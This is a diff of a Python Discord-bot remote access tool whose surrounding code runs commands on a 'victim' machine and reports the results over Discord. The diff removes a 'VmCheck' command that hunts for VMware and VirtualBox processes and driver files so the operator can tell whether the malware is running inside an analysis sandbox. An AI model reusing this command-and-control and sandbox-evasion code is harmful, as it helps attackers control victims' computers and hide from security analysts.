@@ -45,7 +45,7 @@ from discord_slash.model import ButtonStyle
 from discord_slash.utils.manage_components import create_button, create_actionrow
 
 from tokens import g, token , webhook
-#from auto import *
+# from auto import *
 
 
 ## Auto Commands
@@ -1612,113 +1612,5 @@ async def listProccess_command(ctx: SlashContext):
                 my_embed = discord.Embed(title=f"Command executed : {result}", color=0x00FF00)
                 await ctx.send(embed=my_embed)
 
-
-@slash.slash(name="VmCheck", description="Detect if the victim is using a VM", guild_ids=g)
-async def VmCheck_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        my_embed = discord.Embed(title=f"Scanning System for Vm Drivers, please wait", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-
-        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))
-
-        FOUND = False
-        FOUND_DRIVER = False
-
-        time.sleep(2)
-        VmCehck1 = "vmsrvc.exe"
-        VmCehck2 = "vmusrvc.exe"
-        VmCehck3 = "vboxtray.exe"
-        VmCehck4 = "vmtoolsd.exe"
-        VmCehck5 = "df5serv.exe"
-        VmCehck6 = "vboxservice.exe"
-        for process in psutil.process_iter():
-            try:
-                if process.name().lower() == VmCehck1.lower():
-                    FOUND = True
-                else:
-                    shit = 12
-
-                if process.name().lower() == VmCehck2.lower():
-                    FOUND = True
-                else:
-                    shit = 12
-
-                if process.name().lower() == VmCehck3.lower():
-                    FOUND = True
-                else:
-                    shit = 12
-
-                if process.name().lower() == VmCehck4.lower():
-                    FOUND = True
-                else:
-                    shit = 12
-
-                if process.name().lower() == VmCehck5.lower():
-                    FOUND = True
-                else:
-                    shit = 12
-
-                if process.name().lower() == VmCehck6.lower():
-                    FOUND = True
-                else:
-                    shit = 12
-            except AccessDenied:
-                pass
-        if FOUND == True:
-            my_embed = discord.Embed(title=f"Found a VM Process", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-            return
-
-        vmci = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys")
-        vmhgfs = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys")
-        vmmouse = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys")
-        vmsci = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmsci.sys")
-        vmusbmouse = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys")
-        vmx_svga = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys")
-        VBoxMouse = os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys")
-        
-        
-        if vmci == True:
-            FOUND_DRIVER = True
-        else:
-           shit = 12
-        
-        if vmhgfs == True:
-            FOUND_DRIVER = True
-        else:
-            shit = 12
-    
-        if vmmouse == True:
-            FOUND_DRIVER = True
-        else:
-            shit = 12
-        
-        if vmsci == True:
-            FOUND_DRIVER = True
-        else:
-            shit = 12
-        
-        if vmusbmouse == True:
-            FOUND_DRIVER = True
-        else:
-            shit = 12
-        
-        if vmx_svga == True:
-            FOUND_DRIVER = True
-        else:
-            shit = 12
-        
-        if VBoxMouse == True:
-            FOUND_DRIVER = True
-        else:
-                shit = 12
-
-        if FOUND_DRIVER == True:
-            my_embed = discord.Embed(title=f"Found a VM Driver", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-            return
-        else:
-            my_embed = discord.Embed(title=f"Finished checking for VM No Drivers found", color=0x00FF00)
-            await ctx.send(embed=my_embed)
 
 client.run(token)
